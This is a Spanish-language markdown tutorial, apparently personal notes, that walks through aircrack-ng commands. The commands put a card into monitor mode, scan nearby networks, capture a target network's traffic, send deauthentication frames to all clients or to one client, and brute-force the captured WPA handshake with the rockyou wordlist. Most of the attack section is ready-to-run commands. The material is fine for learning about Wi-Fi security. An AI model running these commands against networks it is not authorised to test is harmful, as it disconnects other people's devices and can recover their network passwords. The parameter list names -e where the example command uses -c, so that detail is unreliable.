# Get off my wifi
+ Una serie de notas para sacar a los usuarios no autorizados de tu red WIFI.
+ A su vez muestra cómo hacer un ataque de diccionario a una red WIFI con aircrack-ng

# Teoria 


# Comandos aircrack-ng
Los siguientes comandos permiten:
+ Deautenticar a usuarios de la red WIFI
	+ Pasos 1-4, 6
+ Generar un ataque de diccionario para obtener la contraseña WIFI}
	+ Pasos 1-7
+ Salir del modo monitor
	+ Paso 8

## 1) Mostrar las interfaces
Opción principal
```
sudo airmon-ng
```

Otra opción
```
iwconfig
```

## 2) Deshabilitar cualquier proceso que pueda interferir con la captura de paquetes
```
sudo airmon-ng check kill
```

## 3) Habilitar el modo monitor/promiscuo de nuestra tarjeta de red
Método airmon
```
sudo airmon-ng start wlan0
```
* Cambiamos `wlan0` por el nombre de nuestra interfaz que se ha arrojado `sudo airmon-ng`

Otra opción
```
iw dev <interface> set monitor none
```

Otra opción
```
ifconfig <interface> down
iw dev <interface> set monitor none
ifconfig <interface> up
```


##### Si volvemos a correr el paso uno podremos ver que nuestra interfaz de red ahora se encuentra en modo monitor bajo el nombre de `wlan0mon` ó `wlan0`

## 4) Listar las redes que hay a nuestro alrederor
```
sudo airodump-ng wlan0mon
```
* wlan0mon = nombre_de_la_interfaz

Esto nos arrojará una pantalla con la siguiente información:
+ **BSSID:** Mac Address de nuestro router (punto de acceso)
+ **PWR:** Nivel de señal 
+ **Beacons:** Número de “paquetes anucio” o beacons enviadas por el AP. 
	+ Cada punto de acceso envia alrededor de diez beacons por segundo cuando el rate o velocidad es de 1M, (la más baja) de tal forma que se pueden recibir desde muy lejos.
+ **#Data:** Número de paquetes de datos capturados.
	+ (si tiene clave WEP, equivale tambien al número de IVs), incluyendo paquetes de datos broadcast (dirigidos a todos los clientes).
+ **#/s:** Número de paquetes de datos capturados por segundo calculando la media de los últimos 10 segundos.
+ **CH:** Canal
+ **MB:** Velocidad máxima soportada por el AP. 
	+ Si MB = 11, es 802.11b, 
	+ Si MB = 22es 802.11b+ 
	+ Y velocidades mayores son 802.11g. 
	+ El punto (despues del 54) indica que esa red soporta un preámbulo corto o “short preamble”.
+ **ENC:** Algoritmo de encriptación que se usa. 
	+ OPN = no existe encriptación (abierta)
	+ “WEP?” = WEP u otra (no se han capturado suficientes paquetes de datos para saber si es WEP o WPA/WPA2), 
	+ WEP (sin el interrogante) indica WEP estática o dinámica, 
	+ WPA o WPA2 en el caso de que se use TKIP o CCMP.
+ **CIPHER:** Detector cipher. Puede ser CCMP, WRAP, TKIP, WEP, WEP40, o WEP104.
+ **AUTH:** El protocolo de autenticación usado. Puede ser: 
	+ MGT
	+ PSK (clave precompartida)
	+ OPN (abierta).
+ **ESSID**	Tambien llamado “SSID”
	+ Puede estar en blanco si la ocultación del SSID está activada en el AP. 
	+ En este caso, airodump-ng intentará averiguar el SSID analizando paquetes “probe responses” y “association requests” (son paquetes enviados desde un cliente al AP).

Justo debajo

+ **STATION:** Dirección MAC de cada cliente asociado. 
+ **Lost:** El número de paquetes perdidos en los últimos 10 segundos.
+ **Frames:** El número de paquetes de datos enviados por el cliente.
+ **Probes:** Los ESSIDs a los cuales ha intentado conectarse el cliente.	

## 5) Capturamos el tráfico de la red

```
sudo airodump-ng -c 1 --bssid 36:0A:98:80:97:C3 --write airodump wlan0mon
```
+ **-c** canal
+ **--bssid** bssid
+ **--write** nombre_de_archivo

## 6) Ataque deauth

Ahora abrimos una nueva terminal e iniciamos el ataque deauth para desconectar todos los clientes conectados a la red. Ésto le ayudará en la captura del handshake. Ingrese el comando:

#### Deautenticación a todos los clientes de un WIFI

```
sudo aireplay-ng -0 10 -a 36:0A:98:80:97:C3 wlan0mon
```

+ **-0** Se utiliza para el ataque deauth
+ **10** Es el número de paquetes deauth para ser enviados
+ **-a** Es la dirección MAC de la red WiFi objetivo

#### Deautenticación a solamente un cliente de un WIFI

```
sudo aireplay-ng -0 10 -a 36:00:98:00:97:C3 -c 00:0A:FF:5F:FF:00 wlan0mon
```

+ **-0** Se utiliza para el ataque deauth
+ **10** Es el número de paquetes deauth para ser enviados
+ **-a** Es la dirección MAC de la red WiFi objetivo
+ **-e** Es el ESSID de la red objetivo, es decir, su nombre


Después de lanzar el ataque deauth y conseguir el HANDSHAKE WPA, pulse Ctrl+C .

## 7) Hacer fuerza bruta para averiguar el password

```
sudo aircrack-ng airodump-01.cap -w rockyou.txt
```

## 8) Quitar el modo monitor y volver a utilizar nuestro WIFI
Opción 1
```
# Detenemos el modo monitor
sudo airmon-ng stop wlan0mon

# Levantamos nuestra interfaz
sudo ifconfig wlan0 up

# Inciamos el servicio de red
sudo systemctl start NetworkManager
```

Opción 2
```
ifconfig <interfaz> down
iwconfig <interfaz> mode managed
ifconfig <interfaz> up
```

# Información complementaria
+ <a href="https://medium.com/@Packt_Pub/the-deauthentication-attack-7872c916ed2a" target="_blank">the-deauthentication-attack</a>
+ <a href="https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142" target="_blank">Forcing a device to disconnect from WiFi using a deauthentication attack</a>
+ <a href="https://www.aircrack-ng.org/doku.php?id=deauthentication" target="_blank">Aircrack Deauthentication</a>
+ <a href="https://github.com/spacehuhn/esp8266_deauther" target="_blank">esp8266_deauther</a>
+ <a href="+ https://www.atareao.es/como/procesos-en-segundo-plano-en-linux/" target="_blank">PROCESOS EN SEGUNDO PLANO EN LINUX</a>